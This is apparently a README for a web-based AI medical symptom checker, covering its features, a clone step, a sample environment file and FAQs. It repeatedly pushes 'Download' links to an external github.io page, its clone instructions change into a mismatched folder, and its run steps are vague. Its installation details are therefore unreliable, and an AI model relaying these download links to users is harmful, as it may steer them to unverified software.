# Sanjeevani AI v2026 - Medical Symptom Checker 2026

> **Sanjeevani AI is a browser-based medical symptom checker for version 2026. It brings together agentic AI, multiple analytical agents, and retrieval-supported guidance to help users evaluate symptoms, understand triage recommendations, and decide on possible next steps.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathanqvfoster5830/sanjeevani-ai-health-checker?style=flat-square)](https://github.com/nathanqvfoster5830/sanjeevani-ai-health-checker)

---

<p align="center">
  <a href="https://nathanqvfoster5830.github.io/sanjeevani-ai-health-checker/">
    <img src="https://img.shields.io/badge/Download-Sanjeevani%20AI%20Latest-brightgreen?style=for-the-badge" alt="Download Sanjeevani AI">
  </a>
</p>

> **[Download Sanjeevani AI v2026](https://nathanqvfoster5830.github.io/sanjeevani-ai-health-checker/)**

---

[Download Latest Build](https://nathanqvfoster5830.github.io/sanjeevani-ai-health-checker/)

---

## Overview

Sanjeevani AI is a web-first health assessment tool that processes user-reported symptoms through a coordinated group of AI agents. Its triage-focused design organizes results into practical information about possible urgency, suitable home-care direction, and situations where professional medical attention may be appropriate.

The application is not limited to symptom analysis. It also provides support for interpreting vitals and lab reports, finding hospitals during urgent situations, and reviewing first aid information. Multi-language output and same-script responses make the guidance more accessible to users who prefer a particular language or writing system.

---

## Capabilities

- Analyze symptoms through multiple agents designed for structured health questions
- Retrieve guidance from verified medical reference sources
- Present triage suggestions covering potential care levels and next actions
- Offer home-care information for situations that are not emergencies
- Return responses in multiple languages, including same-script formatting
- Help locate hospitals for urgent or emergency needs
- Interpret basic signals from entered vital readings
- Explain lab report information in a more understandable format
- Provide first aid instructions with text-to-speech support
- Use agentic AI patterns alongside IBM watsonx, ChromaDB, FastAPI, and related supporting tools

---

## Getting Started

Download or clone the repository, then move into the project directory:

```bash
git clone https://github.com/nathanqvfoster5830/sanjeevani-ai-health-checker.git
cd agentic-health-checker
```

When running the project locally, start any included backend or application server with the entry command specified by the repository files. Alternatively, open the web interface from the published build.

---

## Using the Application

1. Launch the web application in a browser.
2. Provide symptoms, vital measurements, or relevant lab report information.
3. Read the generated triage assessment and associated care guidance.
4. If urgent attention is suggested, use the hospital finder.
5. Select a supported language or same-script response format when appropriate.
6. For first aid topics, follow the displayed instructions and enable text-to-speech when it is available.

For more useful results:

- Explain the concern with details such as when it began, how severe it is, and which signs are present.
- Include vital readings or report values whenever they apply.
- Treat the generated information as guidance and consider it alongside personal judgment and local healthcare resources.

---

## Settings and Environment

Configuration is handled through the application or backend settings used by the web stack. Depending on the deployment, review areas such as service credentials, model endpoints, retrieval sources, and language defaults.

A representative environment configuration is shown below:

```env
FASTAPI_HOST=0.0.0.0
FASTAPI_PORT=8000
WATSONX_API_KEY=your_key_here
CHROMADB_PATH=./chroma
DEFAULT_LANGUAGE=en
```

The repository source files remain the authoritative reference if they use different environment variable names or configuration paths.

---

## Requirements

- A web browser to access the interface
- A backend runtime or hosting environment when operating the project locally
- Connectivity to configured AI and retrieval services
- Storage for indexed medical references and application data
- Network access for APIs, online lookups, or hosted deployment functionality

---

## Frequently Asked Questions

**How can I obtain the newest version?**  
Open the latest build link, or pull the most recent repository changes after a release is published.

**Where should I look for configuration values?**  
Review the project environment files, backend configuration, and deployment variables used by the application.

**What can I do if the result does not contain enough detail?**  
Submit additional context, including the symptom duration, severity, age group, vital readings, or relevant report values.

**Can the application respond in different languages?**  
Yes. Sanjeevani AI includes multi-language responses and same-script output support.

**How should emergencies be handled?**  
Use the urgent-care or hospital-finder guidance provided by the application, and contact local emergency services when necessary.

---

## License

This project is available under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
